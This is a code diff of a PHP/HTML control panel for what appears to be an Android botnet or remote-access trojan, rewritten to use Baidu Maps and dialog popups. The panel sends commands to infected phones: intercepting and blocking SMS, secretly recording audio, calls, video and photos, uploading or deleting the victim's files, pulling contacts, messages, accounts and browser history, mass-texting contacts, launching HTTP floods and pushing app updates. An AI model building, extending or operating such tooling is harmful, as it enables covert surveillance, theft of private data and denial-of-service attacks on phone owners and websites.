@@ -34,11 +34,13 @@
 
     <link href="assets/css/bootstrap.css" rel="stylesheet" media="screen">
 	<link href="assets/css/bootstrap-glyphicons.css" rel="stylesheet" media="screen">
-	
-	<script src="http://code.jquery.com/jquery.js"></script>
+	<!-- <script src="assets/js/jquery.js"></script> -->
+	<script src="http://libs.baidu.com/jquery/1.9.0/jquery.js"></script>
 	<script src="assets/js/jquery.tablesorter.min.js"></script>
 	<script src="assets/js/jquery.tablesorter.widgets.min.js"></script>
 	<script src="assets/js/date.js"></script>
+	<script src="assets/js/dialog.js"></script>
+	<script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=IPImFwnLQjdqaov8syqMF4W3c9fcPU28"></script>
 	
     <style type="text/css">
 	  body {
@@ -140,46 +142,246 @@
         text-align: center;
       }
 	</style>
-    <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=false"></script>
-    <script>
-var map;
-function initialize() {
-  var mapOptions = {
-    zoom: 0,
-    center: new google.maps.LatLng(0.0, 0.0),
-	disableDefaultUI: true,
-    panControl: false,
-    zoomControl: true,
-    scaleControl: false,
-    mapTypeId: google.maps.MapTypeId.HYBRID
-  };
-  map = new google.maps.Map(document.getElementById('map-canvas'),
-      mapOptions);
-}
-
-google.maps.event.addDomListener(window, 'load', initialize);
-
-    </script>
 	
+
+  </head>
+  <body style="width: 100%; height: 100%;">
+    <div class="main">
+	  <div class="row" style="height:60%;">
+	    <div class="col-lg-9 devicestable" style="height:100%; min-height:380px; padding-top: 5px; overflow:auto;">
+		   <div id="tablefill"></div>
+		</div>
+  <div class="modal fade" id="imageModal">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+          <h4 class="modal-title">View Images</h4>
+        </div>
+        <div class="modal-body">
+		  <p>UID</p>
+		  <input class="form-control input-small" id="modaluid" type="text" value="">
+		  <p>Start Date</p>
+          <input class="form-control input-small" id="modalstarttime" type="date" placeholder="Start Date">
+		  <p>End Date</p>
+		  <input class="form-control input-small" id="modalendtime" type="date" placeholder="End Date">
+		  <p>Max File Size</p>
+		  <input class="form-control input-small" id="modalfilesize" type="text" placeholder="Max File Size in MB">
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+          <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#displayImages" data-dismiss="modal" onclick="getImages();">View Images</button>
+        </div>
+      </div><!-- /.modal-content -->
+    </div><!-- /.modal-dialog -->
+  </div><!-- /.modal -->
+  
+  <div class="modal fade" id="displayImages">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+          <h4 style="display:inline;" class="modal-title">Images</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input id="defaultSlider" type="range" min="100" max="520" />
+        </div>
+        <div class="modal-body">
+		  <div id="replaceimages"></div>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" onclick="window.clearInterval(window.imgrefresh);" data-dismiss="modal">Close</button>
+        </div>
+      </div><!-- /.modal-content -->
+    </div><!-- /.modal-dialog -->
+  </div><!-- /.modal -->
+	    <div class="col-lg-3 functionslist" style="height:100%; min-height:380px; padding-top: 5px; overflow:auto;">
+		  <h4 style="display: inline-block;">Selected: <a data-toggle="tooltip" rel="tooltip" title="None Selected" data-placement="bottom" id="selectednumber">0</a></h4>&nbsp;&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="clearselection()">Deselect All</button>&nbsp;&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="selectall()">Select All</button>
+		  <table class="table" id="func">
+		    <tr>
+			  <td><button type="button" onclick="addCommand('ringervolumeup')" class="btn btn-default btn-small fullwidth">Ringer Up</button></td>
+			  <td><button type="button" onclick="addCommand('ringervolumedown')" class="btn btn-default btn-small fullwidth">Ringer Down</button></td>
+			</tr>
+		    <tr>
+			  <td><button type="button" onclick="addCommand('mediavolumeup')" class="btn btn-default btn-small fullwidth">Media Up</button></td>
+			  <td><button type="button" onclick="addCommand('mediavolumedown')" class="btn btn-default btn-small fullwidth">Media Down</button></td>
+			</tr>
+		    <tr>
+			  <td colspan="2"><button type="button" onclick="addCommand('screenon')" class="btn btn-default btn-small fullwidth">Screen On</button></td>
+			</tr>
+		    <tr>
+			  <td><button type="button" onclick="addCommand('intercept', true)" class="btn btn-default btn-small fullwidth">Intercept On</button></td>
+			  <td><button type="button" onclick="addCommand('intercept', false)" class="btn btn-default btn-small fullwidth">Intercept Off</button></td>
+			</tr>
+		    <tr>
+			  <td><button type="button" onclick="addCommand('blocksms', true)" class="btn btn-default btn-small fullwidth">Block SMS On</button></td>
+			  <td><button type="button" onclick="addCommand('blocksms', false)" class="btn btn-default btn-small fullwidth">Block SMS Off</button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="audiorecordtime" type="text" placeholder="Time in MS"></td>
+			  <td><button type="button" onclick="addCommand('recordaudio', document.getElementById('audiorecordtime').value)" class="btn btn-default btn-small fullwidth">Record Audio</button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="videorecordtime" type="text" placeholder="Time in MS"></td>
+			  <td><div class="btn-group" style="width:100%"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Record Video <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0%; width: 100%;"><li><a href="#" onclick="addCommand('takevideo', 1, document.getElementById('videorecordtime').value)">Front Camera</a></li><li><a href="#" onclick="addCommand('takevideo', 0, document.getElementById('videorecordtime').value)">Back Camera</a></li></ul></div></td>
+			</tr>
+		    <tr>
+			  <td><button type="button" onclick="alert('Please select Front or Back Camera.')" class="btn btn-default btn-small fullwidth">Take Photo</button></td>
+			  <td><button type="button" onclick="addCommand('takephoto', 1)" class="btn btn-default btn-small halfwidth">Front</button>&nbsp;<button type="button" onclick="addCommand('takephoto', 0)" class="btn btn-default btn-small halfwidth">Back</button></td>
+			</tr>
+		    <tr>
+			  <td><button type="button" onclick="addCommand('recordcalls', true)" class="btn btn-default btn-small fullwidth">Record Calls On</button></td>
+			  <td><button type="button" onclick="addCommand('recordcalls', false)" class="btn btn-default btn-small fullwidth">Record Calls Off</button></td>
+			</tr>
+		    <tr>
+			  <td colspan="2"><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Upload Files <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0; width: 100%"><li><a href="#" onclick="addCommand('uploadfiles')">All</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Calls')">Calls</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Audio')">Audio</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Pictures')">Pictures</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Videos')">Videos</a></li></div></td>
+			</tr>
+		    <tr>
+			  <td colspan="2"><button type="button" onclick="addCommand('changedirectory')" class="btn btn-default btn-small fullwidth">Change Directory</button></td>
+			</tr>
+		    <tr>
+			  <td colspan="2"><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Delete Files <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0; width: 100%"><li><a href="#" onclick="addCommand('deletefiles')">All</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Calls')">Calls</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Audio')">Audio</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Pictures')">Pictures</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Videos')">Videos</a></li></div></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="getamount" type="text" placeholder="Amount"></td>
+			  <td><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Get <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0%;"><li><a href="#" onclick="addCommand('getinboxsms', document.getElementById('getamount').value)">Inbox SMS</a></li><li><a href="#" onclick="addCommand('getsentsms', document.getElementById('getamount').value)">Outbox SMS</a></li><li><a href="#" onclick="addCommand('getbrowserhistory', document.getElementById('getamount').value)">Browser History</a></li><li><a href="#" onclick="addCommand('getbrowserbookmarks', document.getElementById('getamount').value)">Browswer Bookmarks</a></li><li><a href="#" onclick="addCommand('getcallhistory', document.getElementById('getamount').value)">Call History</a></li><li><a href="#" onclick="addCommand('getcontacts', document.getElementById('getamount').value)">Contacts</a></li><li><a href="#" onclick="addCommand('getuseraccounts', document.getElementById('getamount').value)">User Accounts</a></li><li><a href="#" onclick="addCommand('getinstalledapps', document.getElementById('getamount').value)">Installed Apps</a></li></div></td>
+			</tr>
+			<tr>
+				<td colspan="2"><button type="button" data-event="test1" class="btn btn-default btn-small fullwidth">Send SMS<span class="caret"></span></button></td>
+			</tr>
+		    <!-- <tr>
+		    			  <td><input class="form-control input-small" id="smsnumber" type="text" placeholder="Number"><input class="form-control input-small" id="smsmessage" type="text" placeholder="Message"></td>
+		    			  <td><button type="button" onclick="addCommand('sendtext', document.getElementById('smsnumber').value, document.getElementById('smsmessage').value)" class="btn btn-default btn-small fullwidth">Send SMS</button></td>
+		    			</tr> -->
+		    <!-- <tr>
+		    			  <td><input class="form-control input-small" id="deletesmsthreadid" type="text" placeholder="Thread ID"><input class="form-control input-small" id="deletesmsid" type="text" placeholder="ID"></td>
+		    			  <td><button type="button" onclick="addCommand('deletesms', document.getElementById('deletesmsthreadid').value, document.getElementById('deletesmsid').value)" class="btn btn-default btn-small fullwidth">Delete SMS</button></td>
+		    			</tr> -->
+		    <tr>
+				<td colspan="2"><button type="button" data-event="test2" class="btn btn-default btn-small fullwidth">Delete SMS<span class="caret"></span></button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="contactsmessage" type="text" placeholder="Message"></td>
+			  <td><button type="button" onclick="addCommand('sendcontacts', document.getElementById('contactsmessage').value)" class="btn btn-default btn-small fullwidth">Send to Contacts</button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="callnumber" type="text" placeholder="Number"></td>
+			  <td><button type="button" onclick="addCommand('callnumber', document.getElementById('callnumber').value)" class="btn btn-default btn-small fullwidth">Call Number</button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="calllognumber" type="text" placeholder="Number"></td>
+			  <td><button type="button" onclick="addCommand('deletecalllognumber', document.getElementById('calllognumber').value)" class="btn btn-default btn-small fullwidth">Delete Call Log</button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="webpagesite" type="text" placeholder="Site"></td>
+			  <td><button type="button" onclick="addCommand('openwebpage', document.getElementById('webpagesite').value)" class="btn btn-default btn-small fullwidth">Open Page</button></td>
+			</tr>
+			<tr>
+				<td colspan="2"><button type="button" data-event="test3" class="btn btn-default btn-small fullwidth">Open Dialog<span class="caret"></span></button></td>
+			</tr>
+		    <!-- <tr>
+		    			  <td><input class="form-control input-small" id="dialogtitle" type="text" placeholder="Title"><input class="form-control input-small" id="dialogmessage" type="text" placeholder="Message"></td>
+		    			  <td><button type="button" onclick="addCommand('opendialog', document.getElementById('dialogtitle').value, document.getElementById('dialogmessage').value)" class="btn btn-default btn-small fullwidth">Open Dialog</button></td>
+		    			</tr> -->
+		    <tr>
+			  <td><input class="form-control input-small" id="appname" type="text" placeholder="App"></td>
+			  <td><button type="button" onclick="addCommand('openapp', document.getElementById('appname').value)" class="btn btn-default btn-small fullwidth">Open App</button></td>
+			</tr>
+			<tr>
+				<td colspan="2"><button type="button" data-event="test4" class="btn btn-default btn-small fullwidth">HTTP Flood<span class="caret"></span></button></td>
+			</tr>
+		    <!-- <tr>
+		    			  <td><input class="form-control input-small" id="floodsite" type="text" placeholder="Site"><input class="form-control input-small" id="floodtime" type="text" placeholder="Time in MS"></td>
+		    			  <td><button type="button" onclick="addCommand('httpflood', document.getElementById('floodsite').value, document.getElementById('floodtime').value)" class="btn btn-default btn-small fullwidth">HTTP Flood</button></td>
+		    			</tr> -->
+		    <!-- <tr>
+		    			  <td><input class="form-control input-small" id="updateapplink" type="text" placeholder="Direct Link"><input class="form-control input-small" id="updateappversion" type="text" placeholder="Version #"></td>
+		    			  <td><button type="button" onclick="addCommand('updateapp', document.getElementById('updateapplink').value, document.getElementById('updateappversion').value)" class="btn btn-default btn-small fullwidth">Update App</button></td>
+		    			</tr> -->
+		    <tr>
+				<td colspan="2"><button type="button" data-event="test5" class="btn btn-default btn-small fullwidth">Update App<span class="caret"></span></button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="promptupdateversion" type="text" placeholder="Version #"></td>
+			  <td><button type="button" onclick="addCommand('promptupdate', document.getElementById('promptupdateversion').value)" class="btn btn-default btn-small fullwidth">Prompt Update</button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="transferboturl" type="text" placeholder="URL"></td>
+			  <td><button type="button" onclick="addCommand('transferbot', document.getElementById('transferboturl').value)" class="btn btn-default btn-small fullwidth">Transfer Bot</button></td>
+			</tr>
+		    <tr>
+			  <td><input class="form-control input-small" id="timeouttime" type="text" placeholder="Time in MS"></td>
+			  <td><button type="button" onclick="addCommand('settimeout', document.getElementById('timeouttime').value)" class="btn btn-default btn-small fullwidth">Set Timeout</button></td>
+			</tr>
+		    <tr>
+			  <td colspan="2"><button type="button" onclick="addCommand('promptuninstall')" class="btn btn-default btn-small fullwidth">Prompt Uninstall</button></td>
+			</tr>
+            <tr><td></td><td></td><td></td></tr>
+		  </table>
+		</div>
+	  </div>
+	  <div class="row" style="height:37%; ">
+		    <div class="col-lg-5 messageboxcontainer" style="height:100%; min-height: 100%;">
+			  <h4 style="display: inline-block;">History Of: <a id="historyof">All Bots</a></h4>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="stoprefresh(); getHistory(''); autorefresh('');">All Bots</button>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" id="autoscrollbutton" onclick="updateScroll();">Auto Scroll: <?php if($autoscrolltextbox){echo "On";} else {echo "Off";} ?></button>&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="viewCommands();">View Awaiting Commands</button>
+			  <div class="well well-small" id="messagebox" style="max-height: 200%; min-height: 75%; overflow: auto;">
+			    <div id="messages" style="font-size: <?php echo $postboxtextsize . 'px;'; ?>"></div>
+			  </div>
+			</div>
+			<div class="col-lg-4 filestable" style="height:100%; min-height: 100%; overflow: auto;">
+			  <div id="filetablefill"></div>
+			</div>
+	    <div class="col-lg-3 mapcontainer" style="height:100%; min-height: 100%;">
+		  <div class="map" id="map-canvas" style="height:230%; min-height: 100%;"></div>
+		  <button type="button" onClick="window.location='settings.php'" style="width: 48%" class="btn btn-default btn-small">Panel Settings</button>&nbsp;&nbsp;&nbsp;<button type="button" onClick="window.location='logout.php'" style="width: 48%" class="btn btn-default btn-small">Logout</button>
+		</div>
+	  </div>
+	</div>
+	
+	<script src="assets/js/bootstrap.min.js"></script>
 	<script>
+	$(document).ready(function() 
+        { 
+			$("#files").tablesorter();
+        } 
+    );
+    </script>
+<script>
+/*var map;
+function initialize() {*/
+  var map = new BMap.Map("map-canvas");
+// 创建地图实例  
+var point = new BMap.Point(116.404, 39.915);
+// 创建点坐标  
+map.centerAndZoom(point, 1);
+map.enableScrollWheelZoom(true);
+map.addControl(new BMap.NavigationControl());   
+map.addControl(new BMap.ScaleControl());
+map.addControl(new BMap.OverviewMapControl()); 
+map.addControl(new BMap.MapTypeControl());
+ 
+    </script>
+<script>
 	var selected=new Array();
 	
 	var markersArray = [];
-	
 	function gmapsmarker(location1, location2, title) {
-	  var marker = new google.maps.Marker({
+	  /*var marker = new google.maps.Marker({
         position: new google.maps.LatLng(location1, location2),
         map: map,
 		animation: google.maps.Animation.DROP,
         title: title
       });
-	  markersArray.push(marker);
+	  markersArray.push(marker);*/
+	  var point = new BMap.Point(location2, location1);
+	  var marker = new BMap.Marker(point); 
+	  map.addOverlay(marker);
+	   markersArray.push(marker);
+	   
 	}
-	
+	//setTimeout(gmapsmarker(100, 100, 2),1000);
+	//gmapsmarker(116.404, 39.915, 2);
 	function deleteOverlays() {
       if (markersArray) {
         for (i in markersArray) {
-          markersArray[i].setMap(null);
+          //markersArray[i].setMap(null);select(2, 116.404, 39.915)
+          map.removeOverlay(markersArray[i]);
         }
         markersArray.length = 0;
       }
@@ -212,6 +414,7 @@ google.maps.event.addDomListener(window, 'load', initialize);
 	  document.getElementById(bot).innerHTML = '-';
 	  document.getElementById("selectednumber").innerHTML = selected.length;
 	  document.getElementById("selectednumber").setAttribute("data-original-title", selected.join(', '));
+
 	  gmapsmarker(lat, longi, bot);
 	  }
 	}
@@ -376,7 +579,96 @@ google.maps.event.addDomListener(window, 'load', initialize);
 	  xmlhttp.open("GET","deletepics.php?uid="+uid,true);
       xmlhttp.send();
 	}
-	
+jQuery('button[data-event=test1]').on('click', function() {
+            var d = dialog({
+                id: 'align-test1',
+                title: 'Send SMS',
+                content: '<table><tr><td>Number:</td><td><input class="form-control input-small" id="smsnumber" type="text" placeholder="Number" style="width:300px"></td></tr>'+'<tr><td>Message:</td><td><input class="form-control input-small" id="smsmessage" type="text" placeholder="Message"></td></tr><table>',
+
+                okValue: '确 定',
+                quickClose: true,
+                align: $(this).data('align'),
+                //height: 1024,
+                ok: function() {addCommand('sendtext', document.getElementById('smsnumber').value, document.getElementById('smsmessage').value)},
+                follow: this,
+                cancelValue: '取消',
+                cancel: function() {}
+            });
+
+            d.show(this);
+        });
+jQuery('button[data-event=test2]').on('click', function() {
+            var d = dialog({
+                id: 'align-test2',
+                title: 'Delete SMS',
+                content: '<table><tr><td>Thread ID:</td><td><input class="form-control input-small" id="deletesmsthreadid" type="text" placeholder="Thread ID" style="width:300px"></td></tr>'+'<tr><td>ID:</td><td><input class="form-control input-small" id="deletesmsid" type="text" placeholder="ID"></td></tr><table>',
+
+                okValue: '确 定',
+                quickClose: true,
+                align: $(this).data('align'),
+                //height: 1024,
+                ok: function() {addCommand('deletesms', document.getElementById('deletesmsthreadid').value, document.getElementById('deletesmsid').value)},
+                follow: this,
+                cancelValue: '取消',
+                cancel: function() {}
+            });
+
+            d.show(this);
+        });	
+jQuery('button[data-event=test3]').on('click', function() {
+            var d = dialog({
+                id: 'align-test3',
+                title: 'Open Dialog',
+                content: '<table><tr><td>Title:</td><td><input class="form-control input-small" id="dialogtitle" type="text" placeholder="Title" style="width:300px"></td></tr>'+'<tr><td>Message:</td><td><input class="form-control input-small" id="dialogmessage" type="text" placeholder="Message"></td></tr><table>',
+
+                okValue: '确 定',
+                quickClose: true,
+                align: $(this).data('align'),
+                //height: 1024,
+                ok: function() {addCommand('opendialog', document.getElementById('dialogtitle').value, document.getElementById('dialogmessage').value)},
+                follow: this,
+                cancelValue: '取消',
+                cancel: function() {}
+            });
+
+            d.show(this);
+        });	
+jQuery('button[data-event=test4]').on('click', function() {
+            var d = dialog({
+                id: 'align-test4',
+                title: 'HTTP Flood',
+                content: '<table><tr><td>Site:</td><td><input class="form-control input-small" id="floodsite" type="text" placeholder="Site" style="width:300px"></td></tr>'+'<tr><td>Time in MS:</td><td><input class="form-control input-small" id="floodtime" type="text" placeholder="Time in MS"></td></tr><table>',
+
+                okValue: '确 定',
+                quickClose: true,
+                align: $(this).data('align'),
+                //height: 1024,
+                ok: function() {addCommand('httpflood', document.getElementById('floodsite').value, document.getElementById('floodtime').value)},
+                follow: this,
+                cancelValue: '取消',
+                cancel: function() {}
+            });
+
+            d.show(this);
+        });	
+jQuery('button[data-event=test5]').on('click', function() {
+            var d = dialog({
+                id: 'align-test5',
+                title: 'Update App',
+                content: '<table><tr><td>Direct Link:</td><td><input class="form-control input-small" id="updateapplink" type="text" placeholder="Direct Link" style="width:300px"></td></tr>'+'<tr><td>Version:</td><td><input class="form-control input-small" id="updateappversion" type="text" placeholder="Version #"></td></tr><table>',
+
+                okValue: '确 定',
+                quickClose: true,
+                align: $(this).data('align'),
+                //height: 1024,
+                ok: function() {addCommand('updateapp', document.getElementById('updateapplink').value, document.getElementById('updateappversion').value)},
+                follow: this,
+                cancelValue: '取消',
+                cancel: function() {}
+            });
+
+            d.show(this);
+        });	
 $(function(){
 
     $('#defaultSlider').change(function(){
@@ -387,7 +679,6 @@ $(function(){
 
 });
 	</script>
-	
 	<script type='text/javascript'>
      $(document).ready(function () {
          if ($("[rel=tooltip]").length) {
@@ -401,190 +692,6 @@ $(function(){
 		 setInterval(refreshFileTable, <?php echo $filestablerefreshspeed; ?>);
      });
     </script>
-  </head>
-  <body style="width: 100%; height: 100%;">
-    <div class="main">
-	  <div class="row" style="height:60%;">
-	    <div class="col-lg-9 devicestable" style="height:100%; min-height:380px; padding-top: 5px; overflow:auto;">
-		   <div id="tablefill"></div>
-		</div>
-  <div class="modal fade" id="imageModal">
-    <div class="modal-dialog">
-      <div class="modal-content">
-        <div class="modal-header">
-          <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
-          <h4 class="modal-title">View Images</h4>
-        </div>
-        <div class="modal-body">
-		  <p>UID</p>
-		  <input class="form-control input-small" id="modaluid" type="text" value="">
-		  <p>Start Date</p>
-          <input class="form-control input-small" id="modalstarttime" type="date" placeholder="Start Date">
-		  <p>End Date</p>
-		  <input class="form-control input-small" id="modalendtime" type="date" placeholder="End Date">
-		  <p>Max File Size</p>
-		  <input class="form-control input-small" id="modalfilesize" type="text" placeholder="Max File Size in MB">
-        </div>
-        <div class="modal-footer">
-          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
-          <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#displayImages" data-dismiss="modal" onclick="getImages();">View Images</button>
-        </div>
-      </div><!-- /.modal-content -->
-    </div><!-- /.modal-dialog -->
-  </div><!-- /.modal -->
-  
-  <div class="modal fade" id="displayImages">
-    <div class="modal-dialog">
-      <div class="modal-content">
-        <div class="modal-header">
-          <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
-          <h4 style="display:inline;" class="modal-title">Images</h4>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input id="defaultSlider" type="range" min="100" max="520" />
-        </div>
-        <div class="modal-body">
-		  <div id="replaceimages"></div>
-        </div>
-        <div class="modal-footer">
-          <button type="button" class="btn btn-default" onclick="window.clearInterval(window.imgrefresh);" data-dismiss="modal">Close</button>
-        </div>
-      </div><!-- /.modal-content -->
-    </div><!-- /.modal-dialog -->
-  </div><!-- /.modal -->
-	    <div class="col-lg-3 functionslist" style="height:100%; min-height:380px; padding-top: 5px; overflow:auto;">
-		  <h4 style="display: inline-block;">Selected: <a data-toggle="tooltip" rel="tooltip" title="None Selected" data-placement="bottom" id="selectednumber">0</a></h4>&nbsp;&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="clearselection()">Deselect All</button>&nbsp;&nbsp;&nbsp;<button type="button" class="btn btn-default btn-small" onclick="selectall()">Select All</button>
-		  <table class="table" id="func">
-		    <tr>
-			  <td><button type="button" onclick="addCommand('ringervolumeup')" class="btn btn-default btn-small fullwidth">Ringer Up</button></td>
-			  <td><button type="button" onclick="addCommand('ringervolumedown')" class="btn btn-default btn-small fullwidth">Ringer Down</button></td>
-			</tr>
-		    <tr>
-			  <td><button type="button" onclick="addCommand('mediavolumeup')" class="btn btn-default btn-small fullwidth">Media Up</button></td>
-			  <td><button type="button" onclick="addCommand('mediavolumedown')" class="btn btn-default btn-small fullwidth">Media Down</button></td>
-			</tr>
-		    <tr>
-			  <td colspan="2"><button type="button" onclick="addCommand('screenon')" class="btn btn-default btn-small fullwidth">Screen On</button></td>
-			</tr>
-		    <tr>
-			  <td><button type="button" onclick="addCommand('intercept', true)" class="btn btn-default btn-small fullwidth">Intercept On</button></td>
-			  <td><button type="button" onclick="addCommand('intercept', false)" class="btn btn-default btn-small fullwidth">Intercept Off</button></td>
-			</tr>
-		    <tr>
-			  <td><button type="button" onclick="addCommand('blocksms', true)" class="btn btn-default btn-small fullwidth">Block SMS On</button></td>
-			  <td><button type="button" onclick="addCommand('blocksms', false)" class="btn btn-default btn-small fullwidth">Block SMS Off</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="audiorecordtime" type="text" placeholder="Time in MS"></td>
-			  <td><button type="button" onclick="addCommand('recordaudio', document.getElementById('audiorecordtime').value)" class="btn btn-default btn-small fullwidth">Record Audio</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="videorecordtime" type="text" placeholder="Time in MS"></td>
-			  <td><div class="btn-group"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Record Video <span class="caret"></span></button><ul class="dropdown-menu" style="left: -17%;"><li><a href="#" onclick="addCommand('takevideo', 1, document.getElementById('videorecordtime').value)">Front Camera</a></li><li><a href="#" onclick="addCommand('takevideo', 0, document.getElementById('videorecordtime').value)">Back Camera</a></li></ul></div></td>
-			</tr>
-		    <tr>
-			  <td><button type="button" onclick="alert('Please select Front or Back Camera.')" class="btn btn-default btn-small fullwidth">Take Photo</button></td>
-			  <td><button type="button" onclick="addCommand('takephoto', 1)" class="btn btn-default btn-small halfwidth">Front</button>&nbsp;<button type="button" onclick="addCommand('takephoto', 0)" class="btn btn-default btn-small halfwidth">Back</button></td>
-			</tr>
-		    <tr>
-			  <td><button type="button" onclick="addCommand('recordcalls', true)" class="btn btn-default btn-small fullwidth">Record Calls On</button></td>
-			  <td><button type="button" onclick="addCommand('recordcalls', false)" class="btn btn-default btn-small fullwidth">Record Calls Off</button></td>
-			</tr>
-		    <tr>
-			  <td colspan="2"><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Upload Files <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0;"><li><a href="#" onclick="addCommand('uploadfiles')">All</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Calls')">Calls</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Audio')">Audio</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Pictures')">Pictures</a></li><li><a href="#" onclick="addCommand('uploadfiles', 'Videos')">Videos</a></li></div></td>
-			</tr>
-		    <tr>
-			  <td colspan="2"><button type="button" onclick="addCommand('changedirectory')" class="btn btn-default btn-small fullwidth">Change Directory</button></td>
-			</tr>
-		    <tr>
-			  <td colspan="2"><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Delete Files <span class="caret"></span></button><ul class="dropdown-menu" style="left: 0;"><li><a href="#" onclick="addCommand('deletefiles')">All</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Calls')">Calls</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Audio')">Audio</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Pictures')">Pictures</a></li><li><a href="#" onclick="addCommand('deletefiles', 'Videos')">Videos</a></li></div></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="getamount" type="text" placeholder="Amount"></td>
-			  <td><div class="btn-group fullwidth"><button type="button" class="btn btn-default btn-small dropdown-toggle fullwidth" data-toggle="dropdown">Get <span class="caret"></span></button><ul class="dropdown-menu" style="left: -50%;"><li><a href="#" onclick="addCommand('getinboxsms', document.getElementById('getamount').value)">Inbox SMS</a></li><li><a href="#" onclick="addCommand('getsentsms', document.getElementById('getamount').value)">Outbox SMS</a></li><li><a href="#" onclick="addCommand('getbrowserhistory', document.getElementById('getamount').value)">Browser History</a></li><li><a href="#" onclick="addCommand('getbrowserbookmarks', document.getElementById('getamount').value)">Browswer Bookmarks</a></li><li><a href="#" onclick="addCommand('getcallhistory', document.getElementById('getamount').value)">Call History</a></li><li><a href="#" onclick="addCommand('getcontacts', document.getElementById('getamount').value)">Contacts</a></li><li><a href="#" onclick="addCommand('getuseraccounts', document.getElementById('getamount').value)">User Accounts</a></li><li><a href="#" onclick="addCommand('getinstalledapps', document.getElementById('getamount').value)">Installed Apps</a></li></div></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="smsnumber" type="text" placeholder="Number"><input class="form-control input-small" id="smsmessage" type="text" placeholder="Message"></td>
-			  <td><button type="button" onclick="addCommand('sendtext', document.getElementById('smsnumber').value, document.getElementById('smsmessage').value)" class="btn btn-default btn-small fullwidth">Send SMS</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="deletesmsthreadid" type="text" placeholder="Thread ID"><input class="form-control input-small" id="deletesmsid" type="text" placeholder="ID"></td>
-			  <td><button type="button" onclick="addCommand('deletesms', document.getElementById('deletesmsthreadid').value, document.getElementById('deletesmsid').value)" class="btn btn-default btn-small fullwidth">Delete SMS</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="contactsmessage" type="text" placeholder="Message"></td>
-			  <td><button type="button" onclick="addCommand('sendcontacts', document.getElementById('contactsmessage').value)" class="btn btn-default btn-small fullwidth">Send to Contacts</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="callnumber" type="text" placeholder="Number"></td>
-			  <td><button type="button" onclick="addCommand('callnumber', document.getElementById('callnumber').value)" class="btn btn-default btn-small fullwidth">Call Number</button></td>
-			</tr>
-		    <tr>
-			  <td><input class="form-control input-small" id="calllognumber" type="text" placeholder="Number"></td>
-			  <td><button type="button" onclick="addCommand('deletecalllognumber', document.getElementById('calllognumber').value)" class="btn btn-default btn-small fullwidth">Delete Call Log</button></td>
-			</tr>
-		    <tr>
